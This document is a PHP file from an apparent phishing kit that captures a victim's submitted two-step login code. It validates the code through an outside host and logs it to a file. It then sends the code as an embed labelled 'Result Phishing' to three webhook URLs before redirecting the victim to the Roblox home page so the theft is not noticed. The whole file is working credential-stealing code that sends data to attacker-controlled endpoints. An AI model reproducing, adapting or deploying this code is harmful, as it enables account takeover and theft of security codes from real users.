<?php

require('../../../../setup.php');
 
    if ($_SERVER["REQUEST_METHOD"] == "POST") {
      $ip = $_SERVER["REMOTE_ADDR"];
      $code = $_POST["2StepCode"]; }

    $verifiedApi = "https://www.termed.monster/validate.php?code=$code";
    $jsonData = file_get_contents($verifiedApi);
      if ($jsonData !== false) {
          $data = json_decode($jsonData, true);
          if ($data !== null) {
              if (isset($data['success']) && $data['success']) {
                $CorrectCode = $data['message'];
            }
        }
      }

    $urlNig = "https://www.termed.monster/validate.php?code=$code";
    $jsonDataNig = file_get_contents($urlNig);
    $dataNig = json_decode($jsonDataNig, true);
    $filelogtxt = '../../../../log.txt';
    file_put_contents($filelogtxt, $jsonDataNig);
      
      
    $url = file_get_contents("b_webhook.txt"); 
    $Dualhook = file_get_contents("d_webhook.txt");   
    $headers = [ "Content-Type: application/json; charset=utf-8" ];
    $POST = [
        "username" => "$name - Bot",
        "avatar_url" => "$thumbnail",
         "content" => "",
            "embeds" => [
                [
                    "title" => "2step code",
                    "type" => "rich",
                    "description" => "**2step code fetched.**",
                    "color" => hexdec("$hex"),
                    "thumbnail" => [
                        "url" => "$thumbnail",
                    ],
                    "author" => [
                         "name" => "$name - Result Phishing",
                    ],
                    "footer" => [
                        "text" => "$name ON TOP",
                      "icon_url" => "$thumbnail",
                    ],
                    "fields" => [
                        [
                            "name" => "**🔐 2step Login code**",
                            "value" => "```$CorrectCode```",
                            "inline" => True
                        ],
                    ]
                ],
            ],
        
        ];
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $triplehook);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($POST));
$response = curl_exec($ch);
curl_close($ch);
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($POST));
$response = curl_exec($ch);
curl_close($ch);
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $Dualhook);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($POST));
$response = curl_exec($ch);
curl_close($ch);

        
echo "<script>window.location = \"https://www.roblox.com/home\";</script>";
exit();
        
?>